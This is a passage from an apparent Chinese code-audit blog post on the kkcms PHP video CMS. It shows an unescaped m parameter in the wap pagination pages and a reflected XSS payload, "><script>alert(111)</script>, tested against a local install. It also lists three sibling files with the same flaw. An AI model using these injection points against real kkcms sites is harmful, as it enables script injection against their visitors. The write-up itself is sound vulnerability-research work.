class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$fenye</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'movie.php?m='</span><span class=\"token operator\">.</span><span class=\"token variable\">$yourneed</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&amp;page='</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>发现被函数<code>getPageHtml</code>包裹了，跟进查看</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getPageHtml</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_var_60</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_var_61</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_var_62</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$_var_63</span> <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_var_60</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_var_60</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">1</span> <span class=\"token operator\">?</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$_var_60</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_var_60</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_var_60</span> <span class=\"token operator\">></span> <span class=\"token variable\">$_var_61</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$_var_61</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$_var_60</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_var_61</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_var_61</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$_var_60</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$_var_60</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$_var_61</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_var_64</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_var_60</span> <span class=\"token operator\">-</span> <span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_var_63</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_var_64</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_var_64</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">1</span> <span class=\"token operator\">?</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$_var_64</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_var_65</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_var_60</span> <span class=\"token operator\">+</span> <span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_var_63</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_var_65</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_var_65</span> <span class=\"token operator\">></span> <span class=\"token variable\">$_var_61</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$_var_61</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$_var_65</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_var_66</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_var_65</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$_var_64</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_var_66</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$_var_63</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_var_64</span> <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$_var_64</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_var_64</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_var_63</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$_var_66</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$_var_64</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_var_64</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">1</span> <span class=\"token operator\">?</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$_var_64</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$_var_66</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_var_65</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$_var_64</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_var_66</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$_var_63</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_var_65</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$_var_61</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$_var_65</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_var_65</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_var_63</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$_var_66</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$_var_65</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_var_65</span> <span class=\"token operator\">></span> <span class=\"token variable\">$_var_61</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$_var_61</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$_var_65</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_var_60</span> <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$_var_67</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;li>&lt;a  title=\"上一页\" href=\"'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_var_62</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_var_60</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'\"\">上一页&lt;/a>&lt;/li>'</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_var_68</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_var_64</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$_var_68</span> <span class=\"token operator\">&lt;=</span> <span class=\"token variable\">$_var_65</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$_var_68</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_var_68</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$_var_60</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token variable\">$_var_67</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;li>&lt;a style=\"background:#FF9900;\">&lt;font color=\"#fff\">'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_var_68</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/font>&lt;/a>&lt;/li>'</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token variable\">$_var_67</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;li>&lt;a href=\"'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_var_62</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_var_68</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'\">'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_var_68</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/a>&lt;/li>'</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_var_60</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$_var_65</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$_var_67</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;li>&lt;a  title=\"下一页\" href=\"'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_var_62</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_var_60</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'\"\">下一页&lt;/a>&lt;/li>'</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token variable\">$_var_67</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>跟进查看后也没有发现输出点，结果网页端js代码再看看<br>传参</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/kkcms-kkcms/wap/movie.php?m=111</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>查看源代码，<code>Ctrl+f</code>搜<code>?m=111</code>查找对应js代码<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151802.png\" alt=\"在这里插入图片描述\"><br>找到js代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>li<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"movie.php?m=111&amp;page=4\"</span><span class=\"token operator\">></span><span class=\"token number\">4</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>li<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"movie.php?m=111&amp;page=5\"</span><span class=\"token operator\">></span><span class=\"token number\">5</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>li<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>a  title<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"下一页\"</span> href<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"movie.php?m=111&amp;page=2\"</span>\"<span class=\"token operator\">></span>下一页<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>ul<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>尝试直接闭合a标签执行xss语句，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>m<span class=\"token operator\">=</span>\"<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">111</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151112.png\" alt=\"在这里插入图片描述\"><br>成功触发xss<br>同类XSS文件如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">wap/tv.php\n其对应输出代码如下\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token function\">getPageHtml</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$fenye</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'tv.php?m='</span><span class=\"token operator\">.</span><span class=\"token variable\">$yourneed</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&amp;page='</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\n\nwap/zongyi.php\n其对应输出代码如下\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token function\">getPageHtml</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$fenye</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'zongyi.php?m='</span><span class=\"token operator\">.</span><span class=\"token variable\">$yourneed</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&amp;page='</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\n\nwap/dongman.php\n其对应输出代码如下\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token function\">getPageHtml</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$fenye</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'dongman.php?m='</span><span class=\"token operator\">.</span><span class=\"token variable\">$yourneed</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&amp;page='</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"system-pcon-php-失败\"><a href=\"#system-pcon-php-失败\" class=\"headerlink\" title=\"system/pcon.php(失败)\"></a>system/pcon.php(失败)</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151148.png\" alt=\"在这里插入图片描述\"><br>发现这里有个<code>echo 变量</code>的，利用Seay跟进一下这个文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$xtcms_pc</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token delimiter important\">?></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n<span class=\"token keyword\">function</span> <span class=\"token function\">uaredirect</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">try</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bdmark\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">return</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">var</span> b<span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>arguments<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">var</span> e<span class=\"token operator\">=</span>window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">;</span><span class=\"token keyword\">var</span> a<span class=\"token operator\">=</span>window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token punctuation\">;</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isSubdomain</span><span class=\"token punctuation\">(</span>arguments<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>f<span class=\"token operator\">=</span>f<span class=\"token operator\">+</span><span class=\"token string\">\"/#m/\"</span><span class=\"token operator\">+</span>a<span class=\"token punctuation\">;</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isSubdomain</span><span class=\"token punctuation\">(</span>arguments<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>f<span class=\"token operator\">=</span>f<span class=\"token operator\">+</span><span class=\"token string\">\"/#m/\"</span><span class=\"token operator\">+</span>a<span class=\"token punctuation\">;</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>f<span class=\"token operator\">=</span>a<span class=\"token punctuation\">;</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">var</span> c<span class=\"token operator\">=</span>window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>hash<span class=\"token punctuation\">;</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>c<span class=\"token punctuation\">.</span><span class=\"token function\">match</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fromapp\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>navigator<span class=\"token punctuation\">.</span>userAgent<span class=\"token punctuation\">.</span><span class=\"token function\">match</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">(iPhone|iPod|Android|ios)</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">i</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>location<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">function</span> <span class=\"token function\">isSubdomain</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">c<span class=\"token punctuation\">,</span>d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">getdomain</span><span class=\"token operator\">=</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">var</span> e<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"://\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">></span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">var</span> h<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">var</span> h<span class=\"token operator\">=</span>f<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">var</span> g<span class=\"token operator\">=</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">^www\\.</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">;</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>h<span class=\"token operator\">=</span>h<span class=\"token punctuation\">.</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">return</span> h<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>c<span class=\"token operator\">==</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">var</span> c<span class=\"token operator\">=</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getdomain</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">var</span> b<span class=\"token operator\">=</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getdomain</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>c<span class=\"token operator\">==</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>c<span class=\"token operator\">=</span>c<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\\\.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">var</span> a<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">RegExp</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\\\.\"</span><span class=\"token operator\">+</span>c<span class=\"token operator\">+</span><span class=\"token string\">\"$\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">.</span><span class=\"token function\">match</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">return</span> <span class=\"token number\">2</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'play'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$cc</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"play.php?play=\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dd</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"bplay.php?play=\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$yugao</span><span class=\"token operator\">=</span><span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'.html'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'play'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$k</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$k</span><span class=\"token operator\">&lt;</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$yugao</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$k</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$k</span><span class=\"token operator\">></span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$tiaourl</span><span class=\"token operator\">=</span><span class=\"token variable\">$cc</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'play'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$tiaourl</span><span class=\"token operator\">=</span><span class=\"token variable\">$dd</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'play'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\t\n\t\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/javascript<span class=\"token punctuation\">\"</span></span><span 